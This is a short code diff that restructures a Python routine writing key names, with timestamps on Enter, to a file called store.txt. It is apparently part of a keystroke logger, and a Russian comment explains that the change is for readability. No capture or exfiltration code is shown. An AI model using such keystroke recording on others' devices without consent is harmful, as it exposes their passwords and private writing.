@@ -19,17 +19,17 @@ def is_need_to_write(letter):
 
 
 def update(letter, time, store):
-    if not is_need_to_write(letter):
-        return
-    if letter == 'space':
-        store.write(' ')
-    elif letter == 'enter':
-        store.write(time + ' ' + '\n')
-    elif letter == 'backspace':
-        store.write(' ' + letter + ' ')
-    else:
-        store.write(letter)# change_layout(letter))
-    store.close()
+    # мне просто кажется так немого читабельней
+    if is_need_to_write(letter):
+        if letter == 'space':
+            store.write(' ')
+        elif letter == 'enter':
+            store.write(time + ' ' + '\n')
+        elif letter == 'backspace':
+            store.write(' ' + letter + ' ')
+        else:
+            store.write(letter)# change_layout(letter))
+        store.close()
 
 
 with open('store.txt', 'w', encoding='utf-8') as file: file.write('')
